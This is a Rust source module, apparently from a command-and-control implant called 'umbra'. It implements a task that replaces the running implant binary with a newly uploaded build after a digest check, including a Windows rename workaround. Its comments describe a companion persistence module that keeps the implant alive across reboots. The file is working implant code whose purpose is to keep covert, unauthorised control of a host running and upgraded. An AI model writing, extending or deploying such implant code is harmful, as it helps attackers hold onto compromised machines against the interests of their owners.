//! Replacing the running implant.
//!
//! The persistence of the implant -- the start-up entries that make it come
//! back after a reboot -- lives in its own module (`persist.rs`), because it
//! is a manager around a catalogue of techniques rather than a single
//! command.  What is left here is the other half of "staying alive": putting
//! a new build in the place of the running one.
//!
//! The new binary is pushed to the host first (the `upload` task), and the
//! digest is checked before anything is replaced: an implant that installs
//! a file nobody verified is an implant that installs whatever the network
//! sent it.

use std::fs;
use std::path::PathBuf;

/// Replace the running implant with a new one.
///
/// The replacement is written next to the running binary and then moved into
/// its place.  On Windows the running file is locked, so the old one is
/// moved aside first and put back if the move fails.
pub fn update(args: &crate::upk::Value) -> Result<String, String> {
    let path = args.str_or("path", "");
    if path.is_empty() {
        return Err("update needs args.path".to_string());
    }
    let expected = args.str_or("sha256", "");
    let data = fs::read(&path).map_err(|e| format!("update: {e}"))?;
    let digest = crate::config::hex_encode(&crate::crypto::sha256(&data));
    if !expected.is_empty() && !expected.eq_ignore_ascii_case(&digest) {
        return Err(format!("update: the digest does not match ({digest})"));
    }
    let exe = std::env::current_exe().map_err(|e| format!("update: {e}"))?;
    let staged = exe.with_extension("umbra-new");
    fs::copy(&path, &staged).map_err(|e| format!("update: {e}"))?;

    #[cfg(windows)]
    {
        // Windows locks the running binary, so the old one is moved aside
        // and the new one takes its place.
        let old = exe.with_extension("umbra-old");
        let _ = fs::remove_file(&old);
        fs::rename(&exe, &old).map_err(|e| format!("update: {e}"))?;
        if let Err(e) = fs::rename(&staged, &exe) {
            let _ = fs::rename(&old, &exe);
            return Err(format!("update: {e}"));
        }
    }
    #[cfg(not(windows))]
    {
        // On Unix the running binary can be replaced in place.
        fs::rename(&staged, &exe).map_err(|e| format!("update: {e}"))?;
    }
    Ok(format!("the implant was replaced (sha256 {digest})\n"))
}

/// The home directory of the user the implant runs as.
#[allow(dead_code)]
fn home() -> PathBuf {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}
